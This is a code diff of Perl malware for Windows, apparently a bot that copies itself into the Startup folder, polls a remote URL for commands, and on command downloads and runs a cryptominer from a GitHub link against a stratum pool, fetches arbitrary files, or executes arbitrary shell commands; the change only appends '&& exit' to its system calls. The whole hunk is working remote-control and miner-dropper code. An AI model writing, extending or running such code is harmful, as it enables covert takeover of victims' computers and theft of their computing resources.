@@ -103,29 +103,29 @@ while(1){
   while(qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/ !~ m/$0/){
     system(\'copy \' . $0 . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
   }
-  system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"' . $_[0] . '\", \"content.txt\");"\');
+  system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"' . $_[0] . '\", \"content.txt\");" && exit\');
   if(-e \'content.txt\'){
     my $type = `type content.txt`;
     unlink \'content.txt\';
     if($type =~ m/miner<(.+),(.+)>/i){
       while(qx/dir %AppData%/ !~ m/NsCpuCNMiner\.exe/){
         if($Config{archname} =~ m/x86_64/ || $Config{archname} =~ m/x64/){
-          system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");"\');
+          system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");" && exit\');
         }else{
-          system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");"\');
+          system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");" && exit\');
         }
         if(-e \'NsCpuCNMiner.exe\'){
-          system(\'move NsCpuCNMiner.exe %AppData%\');
+          system(\'move NsCpuCNMiner.exe %AppData% && exit\');
         }
       }
       system("%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
     }
     if($type =~ m/download:(.+),(.+),(.+);/i){
-      system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"\' . $1 . \'\", \"\' . $2 . \'\");"\');
-      system(\'move \' . $2 . \' \' . $3);
+      system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"\' . $1 . \'\", \"\' . $2 . \'\");" && exit\');
+      system(\'move \' . $2 . \' \' . $3 . \' && exit\');
     }
     if($type =~ m/terminal:(.+);/i){
-      system($1);
+      system($1 . \' && exit\');
     }
   }
 }';
